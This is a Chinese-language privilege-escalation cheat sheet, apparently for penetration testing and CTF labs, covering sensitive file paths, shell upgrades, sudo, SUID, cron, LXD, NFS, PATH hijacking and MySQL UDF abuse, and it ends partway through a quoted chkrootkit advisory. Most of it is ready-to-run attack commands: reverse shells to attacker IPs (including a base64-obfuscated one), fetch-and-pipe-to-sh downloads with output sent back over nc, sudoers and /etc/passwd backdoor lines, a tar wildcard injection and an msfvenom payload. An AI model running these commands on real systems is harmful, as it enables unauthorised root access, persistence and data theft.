## 6.1系统敏感信息文件

### Windows系统敏感信息：

```
C:\boot.ini                                 //查看系统版本
C:\windows\system32\inetsrv\MetaBase.xml    //IIS配置文件
C:\windows\repair\sam                       //windows初次安装的密码
C:\windows\php.ini                          //php配置信息
C:\program Files\mysql\my.ini               //Mysql配置信息
C:\program Files\mysql\data\mysql\user.MYD  //Mysql root 
C:\windows\my.ini                           //mysql配置文件
```

### Linux系统敏感信息：

```
/etc/passwd                                            //linux用户信息
/etc/shadow                                            //linux用户信息
/etc/group                                             //linux用户组信息
/usr/local/app/apache2/conf/httpd.conf                 //apache2配置文件
/usr/local/app/php5/lib/php.ini                        //php配置文件
/etc/httpd/conf/httpd.conf                             //apache配置文件
/etc/my.cnf                                            //Mysql配置文件
/etc/passwd/usr/local/app/apache2/conf/httpd.conf      //apache2默认配置文件
/usr/local/app/apache2/conf/extra/httpd-vhosts.conf    //虚拟网站设置
/usr/local/app/php5/lib/php.ini                        //PHP相关配置
/etc/httpd/conf/httpd.conf                             //apache
/etc/php5/apache2/php.ini                              //ubuntu系统的默认路径
/home/mowree/.ssh/id_rsa.pub                           //ssh公匙
/home/mowree/.ssh/id_rsa                               //ssh私匙
/home/mowree/.ssh/authorized_keys                      //ssh authorized_keys文件
```

### find常用命令

查找大小为 6969 字节的文件

```
find / -type f -size 6969c 2>/dev/null

`c`代表字节（character）
```

查找文件的所有者为violin的文件

```
find / -user violin 2>/dev/null
```

查找修改日期为1968年5月1日的文件
```
find / -type f -newermt "1968-05-01" ! -newermt "1968-05-02" 2>/dev/null
```

## 6.2 测试提权关键命令
```
which bash sh python python2 python3 perl ruby lua gcc cc make wget curl nc
```
```
locate bash sh python python2 python3 perl ruby lua gcc cc make wget curl nc
```
```
whereis bash sh python python2 python3 perl ruby lua gcc cc make wget curl nc
```
查看 Ubuntu 上已安装的软件
```
dpkg --get-selections | grep package_name
```
查看 centos和redhat上已安装的软件
```
rpm -qa|grep package_name
```
## 6.3、升级shell
```
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm-256color 
Ctrl+Z
stty raw -echo
fg
reset
stty rows 46 columns 188
```

```
没有装wget,所以用curl
curl -O http://192.168.253.138:8082/socat
chmod +x socat

nc -vlp 9998
HOME=/dev/shm ./socat tcp:192.168.253.138:9998 exec:'/bin/bash -li',pty,stderr,sigint,sighup,sigquit,sane

使用script：（没太大必要）
script -qc bash /dev/null

stty raw -echo
fg
```
#### bash shell
```
/bin/sh -i
/bin/bash -i
echo os.system('/bin/bash')
```
#### python
```python2
python -c 'import pty; pty.spawn("/bin/bash")'
```
---
```python3
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
#### perl
```
perl -e 'exec "/bin/bash";'
```
#### ruby
```
exec "/bin/bash"
ruby -e 'exec "/bin/bash"'
```
#### lua
```
lua -e "os.execute('/bin/bash')"
```
#### echo
```
echo os.system('/bin/bash')
echo && 'bash'
```

参考文档：
[Linux 反向 shell 升级为完全可用的 TTY shell](https://www.cnblogs.com/sainet/p/15783539.html)

### 手动设置 `TERM` 环境变量
```
export TERM=xterm
export TERM=xterm-256color
```
### 别名设置

临时别名：  
```
alias ll='ls -l'
```
永久别名：
修改 profile 文件包括 `~/.bashrc` 或 `~/.bash_profile`
```bash
alias ll='ls -l'
```
查看别名：
```
alias
```

### 手动设置终端的行数和宽度
计算宽度
```sh
stty -a |grep 'row'|awk -F'[ ;]+' '{print "stty "$4,$5,$6.$7}'
```


## 6.4、sudo提权

提权指南: [https://gtfobins.github.io](https://gtfobins.github.io)

```
sudo -u admin /bin/bash
```
可写文件添加sudo权限提权
```
echo 'ALL ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers
```

sudo 执行指定用户
```
(natalia) NOPASSWD: /bin/bash

利用：
sudo -u natalia /bin/bash
```

选项：
```
  -A, --askpass                 使用助手程序进行密码提示
  -b, --background              在后台运行命令
  -B, --bell                    提示时响铃
  -C, --close-from=num          关闭所有 >= num 的文件描述符
  -D, --chdir=directory         运行命令前改变工作目录
  -E, --preserve-env            在执行命令时保留用户环境
      --preserve-env=list       保留特定的环境变量
  -e, --edit                    编辑文件而非执行命令
  -g, --group=group             以指定的用户组或 ID 执行命令
  -H, --set-home                将 HOME 变量设为目标用户的主目录
  -h, --help                    显示帮助消息并退出
  -h, --host=host               在主机上运行命令(如果插件支持)
  -i, --login                   以目标用户身份运行一个登录
                                shell；可同时指定一条命令
  -K, --remove-timestamp        完全移除时间戳文件
  -k, --reset-timestamp         无效的时间戳文件
  -l, --list                   
                                列出用户权限或检查某个特定命令；对于长格式，使用两次
  -n, --non-interactive         非交互模式，不提示
  -P, --preserve-groups        
                                保留组向量，而非设置为目标的组向量
  -p, --prompt=prompt           使用指定的密码提示
  -R, --chroot=directory        运行命令前改变根目录
  -r, --role=role               以指定的角色创建 SELinux 安全环境
  -S, --stdin                   从标准输入读取密码
  -s, --shell                   以目标用户运行
                                shell；可同时指定一条命令
  -t, --type=type               以指定的类型创建 SELinux 安全环境
  -T, --command-timeout=timeout 在达到指定时间限制后终止命令
  -U, --other-user=user         在列表模式中显示用户的权限
  -u, --user=user               以指定用户或 ID
                                运行命令(或编辑文件)
  -V, --version                 显示版本信息并退出
  -v, --validate                更新用户的时间戳而不执行命令
  --                            停止处理命令行参数
```

## 6.5、自动化提权脚本

https://www.freebuf.com/articles/network/274223.html
### ‍1.PEASS-ng

PEASS-ng 是一款适用于 Windows 和 Linux/Unix* 和 MacOS 的权限提升工具。

项目地址：[https://github.com/carlospolop/PEASS-ng](https://github.com/carlospolop/PEASS-ng)

- 查看[book.hacktricks.wiki](https://book.hacktricks.wiki/en/windows-hardening/checklist-windows-privilege-escalation.html)上的本地 Windows 权限提升检查表[](https://book.hacktricks.wiki/en/windows-hardening/checklist-windows-privilege-escalation.html)
- [WinPEAS](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS) - Windows 本地权限提升脚本 (C#.exe 和 .bat)
- 查看[book.hacktricks.wiki](https://book.hacktricks.wiki/en/linux-hardening/linux-privilege-escalation-checklist.html)上的本地 Linux 权限提升检查表[](https://book.hacktricks.wiki/en/linux-hardening/linux-privilege-escalation-checklist.html)
- [LinPEAS](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS) - Linux 本地权限提升脚本 (.sh)
	- linpeas_fat.sh：包含所有检查，甚至嵌入了 base64 的第三方应用程序。
	- linpeas.shlinux exploit suggester ：包含所有检查，但仅嵌入第三方应用程序。这是默认设置linpeas.sh。
	- linpeas_small.sh：仅包含最重要的检查，使其大小更小。

脚本获取
```bash
wget https://github.com/peass-ng/PEASS-ng/releases/download/20250401-a1b119bc/linpeas.sh
```
最佳实践：
攻击机 会话1：
```bash
sudo python3 -m http.server 8080
```
攻击机 会话2
```bash
nc -lvnp 9002 | tee linpeas.out
```
靶机
```bash
curl 192.168.56.102:8080/linpeas.sh | sh | nc 192.168.56.102 9002
wget 192.168.56.102:8080/linpeas.sh | sh | nc 192.168.56.102 9002
```
其他用法：
```shell
# Use a linpeas binary
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas_linux_amd64
chmod +x linpeas_linux_amd64
./linpeas_linux_amd64
```
```shell
# From github
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
```
```shell
# Local network
sudo python3 -m http.server 80          #Host
curl 10.10.10.10/linpeas.sh | sh        #Victim

# Without curl
sudo nc -q 5 -lvnp 80 < linpeas.sh #Host
cat < /dev/tcp/10.10.10.10/80 | sh #Victim

# Excute from memory and send output back to the host
sudo python3 -m http.server 80          #Host
nc -lvnp 9002 | tee linpeas.out         #Host
curl 192.168.56.102:80/linpeas.sh | sh | nc 192.168.56.102 9002     #Victim
wget 192.168.56.102:80/linpeas.sh | sh | nc 192.168.56.102 9002     #Victim
```
参考文档：[全平台系统提权辅助工具 PEASS-ng](https://cloud.tencent.com/developer/article/2149150?areaSource=102001.7&traceId=YDjqiGBG8KLGQ9xVd7KXs)


 [**查找 Linux 本地权限提升向量的最佳工具：**](https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#best-tool-to-look-for-linux-local-privilege-escalation-vectors-linpeas) [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**：[https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)（-t 选项）  


### **Enumy**：
[https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)  
- 最新版本：2020年6月4日
- https://github.com/luke-goddard/enumy/releases/download/v1.3/enumy64

**Unix Privesc Check：** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)  
**Linux Priv Checker：** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)  
**BeeRoot：** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)  
**Kernelpop：**枚举 Linux 和 MAC 中的内核漏洞[https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)  
**Mestaploit：** _**multi/recon/local_exploit_suggester**_  
**Linux Exploit Suggester：** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)  
**EvilAbigail（物理访问）：** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)  
**更多脚本的重新编译**：[https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## [参考](https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#references)
### 2.LinEnum

```
https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
	-k输入关键字
	-e输入导出位置
	-t包括详尽的测试
	-s提供当前用户密码以检查sudo权限（不安全）
	-r输入报告名称
	-h显示帮助文本
```

版本0.982

—例如：./LinEnum.sh -s -k keyword -r report -e /tmp/ -t

选项:

- -k 输入关键字
- -e 输入导出位置
- -t 包括彻底的（冗长的）测试
- -s 提供当前用户密码检查sudo perms（不安全）
- -r 输入报告名称
- -h 显示帮助文本

无选项运行=受限扫描/无输出文件

- -e 要求用户输入输出位置，例如/tmp/export。如果这个位置不存在，它将被创建。
- -r 要求用户输入报告的名称。报告（.txt文件）将被保存到当前工作目录。
- -t 执行彻底（缓慢）的测试。如果没有这个开关，则执行默认的` quick `扫描。
- -s 使用当前用户提供的密码来检查sudo权限-注意这是不安全的，只适用于CTF使用！



### 3.Bashark
```
https://raw.githubusercontent.com/redcode-labs/Bashark/master/bashark.sh
```
### 4.LES：Linux Exploit Suggester
```
https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh
```
### 5.LinuxPrivChecker
```
https://raw.githubusercontent.com/sleventyeleven/linuxprivchecker/master/linuxprivchecker.py
```
### 6.Linux Private-i
```
https://raw.githubusercontent.com/rtcrowley/linux-private-i/master/private-i.sh
```
### 7.Linux Smart Enumeration
```
https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh
```
### 8.Linux Exploit Suggester 2
```
https://github.com/jondonas/linux-exploit-suggester-2
```

## 6.6、定时任务提权

```
ls -l /etc/crontab
ls -l /etc/cron.d/automate

cat /etc/crontab
cat /etc/cron.d/automate

cat /etc/cron.daily
cat /etc/cron.hourly
cat /etc/cron.monthly
cat /etc/cron.weekly
```

## 6.7、LXD提权（用户属于lxd组）

- https://www.cnblogs.com/jason-huawen/p/17016263.html

[LXD](https://linuxcontainers.org/lxd/introduction/) 是基于LXC容器的管理程序（hypervisor），由开发 Ubuntu 的公司 Canonical 创建和维护。包含3个组件：
- `lxd` ：系统守护进程，它导出能被本地和网络访问的 RESTful API
- `lxc` ：客户端命令行，它能跨网络管理多个容器主机。
- `nova-compute-lxd` ： OpenStack Nova 插件，它使 OpenStack 如虚拟机一般，管理容器。

==使用条件：==
1. 已经获得目标主机的Shell
2. 可用用户属于lxd组

==利用工具：==
```shell
git clone https://github.com/saghul/lxd-alpine-builder.git

wget https://github.com/saghul/lxd-alpine-builder/blob/master/alpine-v3.13-x86_64-20210218_0139.tar.gz
```
==利用方法：==

将alpine镜像导入lxd,并验证导入是否成功
```
lxc image import alpine.tar.gz --alias alpine && lxd init --auto && lxc image list
```
运行命令创建容器：
```
lxc init alpine privesc -c security.privileged=true && lxc list
```
把主机上的根目录（`/`）挂载到容器内的 `/mnt/root` 目录
```
lxc config device add privesc giveMeRoot disk source=/ path=/mnt/root recursive=true
```
生成公钥
```bash
ssh-keygen -t rsa
```
进入镜像
```
lxc start privesc
```
访问目标主机里的文件系统
```
lxc exec privesc sh
```
进入映射后的root目录
```
cd /mnt/root/root
```
权限持久化：
```
cat /mnt/root/home/machineboy/.ssh/id_rsa.pub >> /mnt/root/root/.ssh/authorized_keys
```
权限验证：
```bash
achineboy@kb-server:~$ ssh root@127.0.0.1
```
## 6.8、SUID提权

提权指南 : https://gtfobins.github.io/

查找SUID⽂件
```
find / -perm -u=s -type f 2>/dev/null
find / -perm -4000 -type f 2>/dev/null
```
### systemd-run

可利用项
```
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/pam_timestamp_check
```
利用方法
```
systemd-run -t /bin/bash

systemd-run 是 systemd 管理的一个命令行工具，用于运行作业或服务单元。在您提供的命令中，使用了 -t 选项，该选项实际上会创建一个临时的登录会话作业单元。-t 选项用于指定新作业单元的类型为 "tty"，这意味着它将建立一个伪终端（pseudo-terminal）作业单元。
```

### SUID可执⾏⽂件已知利⽤提权
```
/usr/sbin/exim-4.84-*
```
### SUID共享库注⼊提权
```
/usr/local/bin/suid-so
```
### SUID环境变量利⽤提权
```
/usr/local/bin/suid-env
```

> https://speakerdeck.com/knaps/escape-from-shellcatraz-breaking-out-of-restricted-unix-shells
> https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells
> https://null-byte.wonderhowto.com/how-to/use-misconfigured-suid-bit-escalate-privileges-get-root-0173929/

### tar提权

tar命令在解压时会默认指定参数--same-owner，即打包的时候是谁的，解压后就给谁；如果在解压时指定参数--no-same-owner（即tar --no-same-owner -zxvf xxxx.tar.gz），则会将执行该tar命令的用户作为解压后的文件目录的所有者。

```shell
tar zcPf 2.tgz /var/backups/.old_pass.bak

tar --no-same-owner -zxf 2.tgz ./
```

```
/sbin/getcap -r / 2>/dev/null
```
### tar通配符漏洞提权

使用条件：
```sh
带有S权限tar命令的执行方式为使用通配符指定文件：
/bin/tar cf 压缩包文件名.tar *
```
利用命令：
```sh
echo "/bin/bash" > upfine.sh
echo "" > "--checkpoint-action=exec=sh upfine.sh"
echo "" > --checkpoint=1
```

利用2：
```sh
cd /home/kali/test
echo 'bash -i >&/dev/tcp/192.168.56.102/1234 0>&1' > upfine.sh
echo "" > "--checkpoint-action=exec=bash upfine.sh"
echo "" > "--checkpoint=1"

tar -cvf revshell.tar ./upfine.sh ./'--checkpoint=1' ./'--checkpoint-action=exec=bash upfine.sh'
```
命令说明：

- 第一步，创建 upfine.sh 文件并写入 /bin/bash，执行后会启动root权限的bash shell
- 第二步，`echo "">"--checkpoint-action=exec=sh upfine.sh"`：创建一个文件名是`--checkpoint-action=exec=sh upfine.sh`的空文件
- 第三步，`echo "" > --checkpoint=1`：创建一个文件名是`--checkpoint=1`的空文件
- 第四步，执行内部调用了 tar 命令的命令

利用原理:
	- `-checkpoint`选项：用于在归档过程中显示进度
		- `--checkpoint=1`：每处理 1 个文件后执行`checkpoint`操作
	- `--checkpoint-action`参数：允许使用`-checkpoint`选项时执行一个命令
		- `--checkpoint-action=exec=sh upfine.sh`：执行`sh upfine.sh`这个命令，触发提权脚本。
	- 执行内部调用了 tar 命令的命令，可类似于 `tar -cvf archive.tar *`
	- 当执行 tar 命令时，通配符`*`会被展开为当前目录下的所有文件，包括之前创建的 `--checkpoint-action=exec=sh upfine.sh` 和 `--checkpoint=1` 这两个文件。此时，tar 会将这两个文件名作为参数处理，运行之前创建的 upfine.sh 脚本，从而启动 bash shell，获得 root 权限。
	

### find提权

```
./find . -exec /bin/sh -p \; -quit

find . -exec whoami \;
find . -exec '/bin/bash' -p \;
```

## 6.9、SGID提权

文件搜索

```
find / -perm -g=s -type f 2>/dev/null
find / -perm -2000 -type f 2>/dev/null
```

提权指南 https://gtfobins.github.io/

## 6.10、可写文件提权

高权限可写文件寻找

```
find / -type f -perm -u+wx -perm -u+s -print
find / -type f -perm -u+wx \( -user root -o -group root \) -print
find / -type f  -writable 2>/dev/null
find / -perm -o=rw 2>/dev/null
```

可写文件添加sudo权限提权

```
# 全部用户添加
echo "ALL ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers

# 为指定admin用户添加全部权限
echo "admin ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers

# 指定用户添加切换权限
echo "admin ALL=(ALL) NOPASSWD: /bin/su" >> /etc/sudoers
echo "xxxx ALL=(ALL) NOPASSWD: /bin/su" >> /etc/sudoers
echo 'echo "ALL ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers' >> xxx.txt
```

可写文件反弹shell提权

```
### bash反弹shell

/bin/bash -i >& /dev/tcp/192.168.56.102/4444 0>&1

/bin/bash -c "/bin/bash -i >& /dev/tcp/192.168.56.102/8888 0>&1"

bash -c 'exec bash -i &>/dev/tcp/192.168.169.129/6666 <&1'

bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvODA4MCAwPiYx}|{base64,-d}|{bash,-i}
```
## 6.11、密码寻找

使用find命令，检查当前用户所有可读的文件，生成一个文件的绝对路径列表保存在一个文件中
```
find / -type f -readable 2>/dev/null > /tmp/readable_files.txt

find / -type f -exec test -r {} \; -print 2>/dev/null > /tmp/readable_files.txt
```
不支持-readable的环境
```
find / -type f \( -perm -u=r -o -perm -g=r -o -perm -o=r \) -exec test -r {} \; -print 2>/dev/null > /tmp/readable_files.txt

find / -path /proc -prune -o -type f \( -perm -u=r -o -perm -g=r -o -perm -o=r \) -exec test -r {} \; -print 2>/dev/null > /tmp/readable_files.txt &
```
在文件列表的文件中过滤关键词
```
for i in $(cat readable_files.txt);do grep -El 'pass' $i;done > content_search_pass.txt &
```

```
for i in $(cat readable_files.txt);do grep -El 'runner|asahi' $i;done > content_search_user.txt &
```


## 6.12、敏感文件寻找

配置文件查找

```
find / -type f -name "*conf*" 2>/dev/null 

cat xxx.conf |grep -i pass
```

可写文件查找

```
find / -type f  -writable  2>/dev/null > /tmp/w.txt
```

查找包含用户名关键字的文件和目录

```shell
查找包含用户名关键字的文件
find / -type f -iname "*$(whoami)*" 2>/dev/null 

查找包含用户名关键字的目录
find / -type d -iname "*$(whoami)*" 2>/dev/null 
find / -type f -iname "*sickos*" 2>/dev/null 
    -iname 忽略大小写
```



```sh
find / -user root -perm 4000 2>/dev/null
```

## 6.13、可执行高权限python脚本提权

```shell
import os
os.system('/usr/bin/bash /tmp/shell.sh')

cat /tmp/shell.sh
bash -i >& /dev/tcp/192.168.56.102/8888 0>&1
```



## 6.14、/etc/passwd /etc/shadow提权

```
ls -l /etc/passwd
cat /etc/passwd

ls -l /etc/shadow
cat /etc/shadow
```

### /etc/passwd 写入提权

```
发现 /etc/passwd 文件可以写入
可以追加一个用户和密码到/etc/passwd文件末尾，通过切换用户拿到root权限

1、生成自定义的新密码
	mkpasswd -m sha-512
	密码：123456
	或
	openssl passwd -1 123456
		$6$CIO00Exyh4VYh7i.$xBQ6lbLlk9k92BnoQXrEzFx2clt7mw4KL3Z/dbFhWpzRQvwNollh.KZAehNRmuYjg8bxwrh2OqgyyXoWhUZKg.

2、拼接字符test:$6$CIO00Exyh4VYh7i.$xBQ6lbLlk9k92BnoQXrEzFx2clt7mw4KL3Z/dbFhWpzRQvwNollh.KZAehNRmuYjg8bxwrh2OqgyyXoWhUZKg./:0:0:root:/root:/bin/bash

3、传入passwd文件
echo 'test:$6$CIO00Exyh4VYh7i.$xBQ6lbLlk9k92BnoQXrEzFx2clt7mw4KL3Z/dbFhWpzRQvwNollh.KZAehNRmuYjg8bxwrh2OqgyyXoWhUZKg./:0:0:root:/root:/bin/bash' >> /etc/passwd

4、登录
ssh test@192.168.56.999
```

### /etc/shadow 提权

#### 读取破解

```
当文件可读时，可以查看用户的密文密码

1、根据密码文开头部分可以判断加密算法：
	$6 : sha 512
2、使用工具爆破密文
	sudo john root-shadow.txt --wordlist=/usr/share/wordlists/rockyou.txt
3、登录
```
#### 写入提权
```
当文件写入时，可以替换高级用户的密文密码实现提权

1、生成新密文密码
	mkpasswd -m sha-512
2、将密文写入shadow文件
3、登录
```

## 6.15、环境变量劫持提权

1、创建同名命令，并将想要执行的命令写入
```
cd tmp
touch netstat
echo "/bin/bash">netstat
```
2、对该文件赋予权限，使其可执行
```
chmod 777 netstat
```
3、修改环境变量
```
把/tmp目录加到环境变量最靠前的位置
export PATH=/tmp:$PATH

或

把当前目录加到环境变量最靠前的位置
export PATH=.:$PATH
```
4、执行目标文件，完成提权
```
指定环境变量，执行对象命令或文件
sudo --preserve-env=PATH /usr/bin/check_syslog.sh

或直接执行
./script/shell
```
## 6.16、NFS提权

### 可用标志
```
cat /etc/exports
/tmp *(rw,sync,insecure,no_root_squash,no_subtree_check)
```
no_root_squash 是 NFS（Network File System）共享设置中的⼀个选项。它的作⽤是允许 root ⽤户 

在 NFS 客户端机器上拥有和在 NFS 服务器上相同的权限。 

### 使用方法

在kali中：
```
挂载共享目录
mount -o rw,vers=3 10.10.10.12:/tmp /nfs
生成payload
msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /nfs/shell.elf
加权限
chmod +xs shell.elf
```
在靶机中：
```
执行payload
/tmp/shell.elf
```
### 原理

默认情况下，NFS 使⽤ root_squash 选项，这意味着在 NFS 客户端上，root ⽤户的所有请求都被映射为⼀个匿名⽤户（通常是 nobody 或 nfsnobody ），这样可以防⽌客户端的 root ⽤户在 NFS 共享上进⾏任意操作。 

然⽽，如果你设置了 no_root_squash 选项，那么在 NFS 客户端上的 root ⽤户就可以像在本地⽂件系统上⼀样，拥有对 NFS 共享的完全控制权限。这在某些情况下可能是必要的，但是也可能引⼊安全⻛险，因为任何可以在客户端获取 root 权限的⽤户都可以在 NFS 共享上进⾏任意操作。因此， no_root_squash 选项应该谨慎使⽤，只在确实需要 root ⽤户在 NFS 客户端上拥有完全权限的情况下才使⽤。 

/tmp *(rw,sync,insecure,no_root_squash,no_subtree_check) 命令详解

- 我想让所有的主机都能访问 /tmp ⽬录
- 并且他们可以进⾏读写（ rw ）
- 我想要所有的写操作都⽴即⽣效（ sync ）
- 我允许使⽤⾮保留端⼝连接（ insecure ）
- 我不希望将 root ⽤户请求映射为匿名⽤户（ no_root_squash ）
- 并且我不希望进⾏⼦树检查（ no_subtree_check ）

注：根据Rosynirvana反馈，参照 https://gtfobins.github.io/gtfobins/dash/ ，在Debian (<= Stretch)版本 

的Linux发⾏包中，msfvenom中的 -p 参数可能⽆效，导致此⽅法⽆法提权，需要您酌情变通。

## 6.17、进程信息信息获取工具pspy64

项目地址：

https://github.com/DominicBreuker/pspy/releases/

```
wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64
```

```
您可以运行PSPY-help，以了解旗帜及其含义。 摘要如下：
-p：启用打印命令到stdout（默认为启用）
-f：启用打印文件系统事件到stdout（默认情况下禁用）
-r：目录列表可以使用Inotify观看。 PSPY将递归观看所有子目录（默认情况下，Watches /usr， /tmp， /etc， /etc， /home， /var和 /opt）。 
-d：目录列表可以使用Inotify观看。 PSPY只会观看这些目录，而不是子目录（默认情况下为空）。 
-i：procfs扫描之间的毫秒间隔。 PSPY定期扫描新过程，无论求解事件如何，以防万一未收到某些事件。 
-c：以不同颜色的打印命令。 文件系统事件已不再颜色，命令基于过程UID具有不同的颜色。 
--debug :打印否则隐藏的详细错误消息。 
```

一些更复杂的例子:

```
# 同时打印命令和文件系统事件，并每1000毫秒扫描procf（= 1sec）
./pspy64 -pf -i 1000 

# 将观察者递归地将两个目录放在两个目录中
./pspy64 -r /path/to/first/recursive/dir -r /path/to/second/recursive/dir -d /path/to/the/non-recursive/dir

# 禁用打印发现的命令，但启用文件系统事件
./pspy64 -p=false -f
```

下载链接

```
32 bit big, static version: pspy32 
   https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy32

64 bit big, static version: pspy64 
   https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64

32 bit small version: pspy32s 
   https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy32s

64 bit small version: pspy64s 
    https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64s
```
## 6.18、mysql-udf提权

不同系统下的udf文件：
https://www.cnblogs.com/PaineLei/p/14065515.html

参考文献：https://blog.csdn.net/Bossfrank/article/details/131424479

提权条件
```
1、mysql用户对mysql库拥有create、insert、delete等权限（最好是root用户）
	SHOW GRANTS;
	
2、需要securefile_priv 为空：
	show variables like '%secure_file_priv%';
	或
	grep secure_file_priv /etc/my.cnf
		值为 /var/lib/mysql-files/ ，这意味着只允许在该目录下进行文件操作。
		值为 空字符串（''），则不限制文件操作的范围
		值为 NULL （/_nʌll/），则禁止这些操作，无法进行任何与文件相关的操作。

3、mysql需要有插件目录
	show variables like '%plugin_dir%';
	
4、编译命令可用
	which gcc
```
准备利⽤⽂件获取

方法1：
```
searchsploit mysql udf
根据数据库版本选择利用
	- MariaDB 5.5基于MySQL 5.5
	- MariaDB 10.0相当于MySQL 5.6
	- MariaDB 10.1相当于MySQL 5.7
	- 从MariaDB 10.2开始，MariaDB与MySQL有了显著的分歧，因此很难找到一个直接的对应版本
```
方法2：
```
kali自带利用文件路径：
	/usr/share/sqlmap/data/udf/mysql/linux/32/lib_mysqludf_sys.so_
	/usr/share/sqlmap/data/udf/mysql/linux/64/lib_mysqludf_sys.so_
	/usr/share/sqlmap/data/udf/mysql/windows/32/lib_mysqludf_sys.dll_
	/usr/share/sqlmap/data/udf/mysql/windows/64/lib_mysqludf_sys.dll_

解码（kali中为了防止被误杀，所以做了编码处理）
	python3 /usr/share/sqlmap/extra/cloak/cloak.py -i lib_mysqludf_sys.so_ -o lib_mysqludf_sys.so
```
将文件传输到目标机器
```
kali : sudo python3 -m http.server 80
target : wget http://kali_ip/1518.c
```
编译⽣成共享库⽂件
```
cd /tmp
gcc -g -c 1518.c -fPIC -o 1518.o
gcc -g -shared -Wl,-soname,1518.so -o 1518.so 1518.o -lc
```
利用过程
```
#上传UDF的动态链接库文件
use mysql;
create table foo(line blob);
insert into foo values(load_file('/tmp/1518.so'));
select * from foo into dumpfile '/mysql插件目录/1518.so';
#创建自定义函数
create function do_system returns integer soname '1518.so';


select hex(load_file('D:\\02-Hacking_Tools\\02-vuln-exploit\\sqlmap\\extra\\cloak\\lib_mysqludf_sys.dll')) into dumpfile 'E:\\phpStudy\\PHPTutorial\\MySQL\\lib\\plugin\\udf.dll';
#ps：这里windows下目录结构要进行转义双写

但是有时候这一步的写入步骤只会写入一部分的内容，导致接下来的步骤都失败，所以也可以直接写入十六进制数据，详见：[MySQL UDF 提权十六进制查询 | 国光](https://www.sqlsec.com/tools/udf.html "MySQL UDF 提权十六进制查询 | 国光")
```
执⾏udf：
```
select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');
```
提权：
```
/tmp/rootbash -p
```
## 6.19、Docker remote Api未授权访问

https://www.secpulse.com/archives/55928.html

**Tunnel Manager - From RCE to Docker Escape**：https://paper.seebug.org/396/

## docker用户 提权

```sh
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

## 6.20、chkrootkit 提权

Chkrootkit0.49以及以下版本均存在本地提权漏洞

[Chkrootkit 0.49本地提权漏洞利用与防范研究](https://zhuanlan.zhihu.com/p/26357609)

这是linux下的一个后门检测工具

```
searchsploit -m linux/local/33899.txt

☁  test  cat 33899.txt 
We just found a serious vulnerability in the chkrootkit package, which
may allow local attackers to gain root access to a box in certain
configurations (/tmp not mounted noexec).

The vulnerability is located in the function slapper() in the
shellscript chkrootkit:

#
# SLAPPER.{A,B,C,D} and the multi-platform variant
#
slapper (){
   SLAPPER_FILES="${ROOTDIR}tmp/.bugtraq ${ROOTDIR}tmp/.bugtraq.c"
   SLAPPER_FILES="$SLAPPER_FILES ${ROOTDIR}tmp/.unlock ${ROOTDIR}tmp/httpd \
   ${ROOTDIR}tmp/update ${ROOTDIR}tmp/.cinik ${ROOTDIR}tmp/.b"a
   SLAPPER_PORT="0.0:2002 |0.0:4156 |0.0:1978 |0.0:1812 |0.0:2015 "
   OPT=-an
   STATUS=0
   file_port=

   if ${netstat} "${OPT}"|${egrep} "^tcp"|${egrep} "${SLAPPER_PORT}">
/dev/null 2>&1
      then
      STATUS=1
      [ "$SYSTEM" = "Linux" ] && file_port=`netstat -p ${OPT} | \
         $egrep ^tcp|$egrep "${SLAPPER_PORT}" | ${awk} '{ print  $7 }' |
tr -d :`
   fi
   for i in ${SLAPPER_FILES}; do
      if [ -f ${i} ]; then
         file_port=$file_port $i
         STATUS=1
      fi
   done
   if [ ${STATUS} -eq 1 ] ;then
      echo "Warning: Possible Slapper Worm installed ($file_port)"
   else
      if [ "${QUIET}" != "t" ]; then echo "not infected"; fi
         return ${NOT_INFECTED}
   fi
}


The line 'file_port=$file_port $i' will execute all files specified in
$SLAPPER_FILES as the user chkrootkit is running (usually root), if
$file_port is empty, because of missing quotation marks around the
variable assignment.

Steps to reproduce:

- Put an executable file named 'update' with non-root owner in /tmp (not
mounted noexec, obviously)
- Run chkrootkit (as uid 0)

Result: The file /tmp/update will be executed as root, thus effectively
rooting your box, if malicious content is placed inside the file.

If an attacker knows you are periodically running chkrootkit (like in
cron.daily) and has write access to /tmp (not mounted noexec), he may
